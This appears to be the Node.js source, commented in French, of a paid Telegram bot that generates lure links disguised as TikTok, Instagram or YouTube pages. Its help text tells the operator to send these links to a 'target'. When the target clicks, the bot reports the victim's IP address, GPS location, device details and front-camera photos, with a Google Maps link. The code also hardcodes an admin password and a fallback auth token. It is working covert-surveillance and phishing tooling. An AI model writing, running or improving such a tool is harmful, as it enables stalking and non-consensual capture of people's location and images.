const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");
const fs = require('fs');
const path = require('path');
const crypto = require("crypto");

// Configuration de l'environnement
dotenv.config();

// --- 1. GESTION DE LA PERSISTANCE (SAUVEGARDE) ---
// Dossier de données
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir); // Créer le dossier s'il n'existe pas
}

// Fichier des utilisateurs
const usersFilePath = path.join(dataDir, 'users.json');

// Charger les données existantes
let usersData = {};
if (fs.existsSync(usersFilePath)) {
    try {
        usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
    } catch (e) {
        console.error("⚠️ Erreur lecture users.json, réinitialisation.", e.message);
        usersData = {};
    }
}

// Fonction de sauvegarde
function saveUsers() {
    try {
        fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
    } catch (e) {
        console.error("❌ Erreur de sauvegarde :", e.message);
    }
}

// --- 2. CONFIGURATION DU BOT ---
// Réduire les logs verbeux TLS
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

// Filtrer les logs console encombrants
const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(" ");
    if (message.includes("TLSWrap") || message.includes("Symbol(") || message.includes("kBuffer")) return;
    originalLog.apply(console, args);
};

// Vérification du Token
const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error("❌ TELEGRAM_BOT_TOKEN manquant !");
    process.exit(1);
}

// Initialisation du bot
const bot = new TelegramBot(token, { 
    polling: {
        autoStart: true,
        params: { timeout: 10 }
    } 
});

// URL du serveur backend (pour l'API)
const BASE_URL = process.env.RENDER_EXTERNAL_URL 
    ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, "")
    : `http://localhost:${process.env.PORT || 5000}`;

// Authentification sécurisée (doit correspondre à app.js)
const DEFAULT_SECURE_TOKEN = "secure_default_token_" + crypto.createHash("sha256").update("replit_telegram_bot_2024").digest("hex");
const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;

// --- 3. VARIABLES D'ÉTAT ---
let isAdminMode = false;

console.log(`🤖 Bot Telegram démarré !`);
console.log(`📡 Connecté au backend : ${BASE_URL}`);

// --- 4. COMMANDES ADMINISTRATEUR ---

// Activer le mode Admin (Mot de passe)
bot.onText(/DsSiakaAdmin/, (msg) => {
    isAdminMode = true;
    bot.sendMessage(msg.chat.id, "🔓 **Mode Admin ACTIVÉ !**\n\nCommandes disponibles :\n`/addcoins [ID] [MONTANT]`\n`/lock` pour verrouiller.", { parse_mode: "Markdown" });
});

// Désactiver le mode Admin
bot.onText(/\/lock/, (msg) => {
    isAdminMode = false;
    bot.sendMessage(msg.chat.id, "🔒 **Mode Admin VERROUILLÉ.**");
});

// Ajouter des jetons (Seulement si Admin)
bot.onText(/\/addcoins (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdminMode) return bot.sendMessage(chatId, "🚫 **Accès refusé.** Entrez le mot de passe admin.");

    const targetId = match[1]; // ID de l'utilisateur cible
    const amount = parseInt(match[2]); // Montant à ajouter

    if (!usersData[targetId]) usersData[targetId] = { coins: 0 };
    usersData[targetId].coins += amount;
    
    saveUsers(); // Sauvegarde immédiate
    
    bot.sendMessage(chatId, `✅ **Succès !**\n${amount} jetons ajoutés à l'utilisateur \`${targetId}\`.\nNouveau solde : ${usersData[targetId].coins} 🪙`, { parse_mode: "Markdown" });
    
    // Notification à l'utilisateur (optionnel, peut échouer si l'user n'a pas démarré le bot)
    bot.sendMessage(targetId, `🎁 **Félicitations !**\nL'administrateur vous a crédité de ${amount} jetons.\nNouveau solde : ${usersData[targetId].coins} 🪙`).catch(() => {});
});

// --- 5. COMMANDES UTILISATEUR ---

// /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const coins = usersData[chatId]?.coins || 0;
    
    bot.sendMessage(chatId, 
        `🔥 *Bot de Capture Activé !*\n\n` +
        `💰 *Votre Solde :* ${coins} jetons\n\n` +
        `🎯 *Menu :* \n` +
        `/generate - Créer un lien (coût: 1 🪙)\n` +
        `/balance - Voir mon solde\n` +
        `/help - Aide`, 
        { parse_mode: "Markdown" }
    );
});

// /balance (Voir solde)
bot.onText(/\/balance/, (msg) => {
    const coins = usersData[msg.chat.id]?.coins || 0;
    bot.sendMessage(msg.chat.id, `💰 **Votre portefeuille :**\n\nVous possédez : *${coins} jetons* 🪙`, { parse_mode: "Markdown" });
});

// /generate (Générer lien)
bot.onText(/\/generate/, (msg) => {
    const chatId = msg.chat.id;
    const coins = usersData[chatId]?.coins || 0;

    // 1. Vérifier le solde AVANT d'afficher le menu
    if (coins <= 0) {
        return bot.sendMessage(chatId, "⚠️ **Solde insuffisant !**\n\nIl vous faut 1 jeton pour générer un lien.\nContactez l'administrateur pour recharger votre compte.", { parse_mode: "Markdown" });
    }

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🎵 TikTok", callback_data: "tiktok" }, { text: "📸 Instagram", callback_data: "instagram" }],
                [{ text: "📺 YouTube", callback_data: "youtube" }],
            ],
        }
    };

    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nSolde actuel : ${coins} 🪙\nCoût par lien : 1 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
});

// --- 6. GESTION DES CLICS (CALLBACKS) ---
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // Répondre pour arrêter le chargement du bouton
    // On ne met pas de texte ici pour éviter le popup, sauf erreur
    
    // Cas 1 : Voir les données (data_ID)
    if (data.startsWith("data_")) {
        bot.answerCallbackQuery(query.id);
        const linkId = data.replace("data_", "");
        await sendDataById(chatId, linkId);
        return;
    }

    // Cas 2 : Générer un lien (tiktok, instagram, etc.)
    const platform = data;
    
    // Vérification de sécurité du solde (Double check)
    if (!usersData[chatId] || usersData[chatId].coins <= 0) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
    }

    try {
        // Appel à l'API locale (app.js) pour créer le lien
        const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
        const { id, url } = response.data;

        // ✅ DÉDUCTION DU JETON
        usersData[chatId].coins -= 1;
        saveUsers(); // Sauvegarder immédiatement

        bot.answerCallbackQuery(query.id, { text: "✅ Lien généré ! -1 Jeton" });

        const message = `✅ *LIEN CRÉÉ AVEC SUCCÈS !*\n\n` +
                        `🔗 *Lien :* ${url}\n` +
                        `🆔 *ID :* \`${id}\`\n\n` +
                        `💰 *Nouveau solde :* ${usersData[chatId].coins} 🪙\n` +
                        `⚡ Les données arriveront ici dès que la victime clique.`;

        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔗 Ouvrir", url: url }],
                    [{ text: "📊 Voir Données", callback_data: `data_${id}` }]
                ]
            }
        };

        bot.sendMessage(chatId, message, { parse_mode: "Markdown", disable_web_page_preview: true, ...keyboard });

    } catch (error) {
        console.error("Erreur génération:", error.message);
        bot.answerCallbackQuery(query.id, { text: "❌ Erreur serveur", show_alert: true });
    }
});

// --- 7. FONCTIONS D'AFFICHAGE DES DONNÉES ---

// /data [ID]
bot.onText(/\/data (.+)/, async (msg, match) => {
    await sendDataById(msg.chat.id, match[1].trim());
});

async function sendDataById(chatId, linkId) {
    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;

        let message = `📊 *RAPPORT DE CAPTURE* - \`${linkId}\`\n\n`;
        message += `⏰ *Date :* ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
        message += `🌐 *IP :* ${data.ip || "Masquée"}\n\n`;

        // Localisation
        if (data.location && data.location.latitude) {
            message += `📍 *Position :* ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
            message += `(Précision: ~${data.location.accuracy || "?"}m)\n`;
        } else {
            message += `📍 *Position :* Refusée ou indisponible\n`;
        }

        // Appareil
        if (data.device) {
            message += `📱 *Mobile :* ${data.device.vendor || ""} ${data.device.model || data.device.platform || "Inconnu"}\n`;
            message += `🔋 *Batterie :* ${data.device.batteryLevel ? (data.device.batteryLevel * 100) + "%" : "?"}\n`;
        }

        // Photos
        const photoCount = data.images ? data.images.length : 0;
        message += `\n📸 *Photos capturées :* ${photoCount}`;

        await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

        // Envoi de la 1ère photo
        if (photoCount > 0) {
            const imgBuffer = Buffer.from(data.images[0], "base64");
            await bot.sendPhoto(chatId, imgBuffer, { caption: "📸 Photo 1 (Caméra Frontale)" });
        }

        // Lien Google Maps
        if (data.location && data.location.latitude) {
            const mapsUrl = `https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}`;
            bot.sendMessage(chatId, `🗺️ [Ouvrir sur Google Maps](${mapsUrl})`, { parse_mode: "Markdown", disable_web_page_preview: false });
        }

    } catch (error) {
        bot.sendMessage(chatId, `❌ **Erreur :** Aucune donnée trouvée pour l'ID \`${linkId}\`.\nPeut-être que personne n'a encore cliqué ?`, { parse_mode: "Markdown" });
    }
}

// /help
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, 
        `📚 *AIDE*\n\n` +
        `1. Tapez /generate pour avoir le menu.\n` +
        `2. Sélectionnez un leurre (TikTok, etc.).\n` +
        `3. Envoyez le lien à la cible.\n` +
        `4. Quand la cible clique, vous recevez les infos ici.\n\n` +
        `⚠️ *Note :* Chaque lien coûte 1 jeton.`, 
        { parse_mode: "Markdown" }
    );
});

// Gestion des erreurs globales
bot.on("polling_error", (error) => console.log(`⚠️ Erreur Polling: ${error.message}`));
bot.on("webhook_error", (error) => console.log(`⚠️ Erreur Webhook: ${error.message}`));
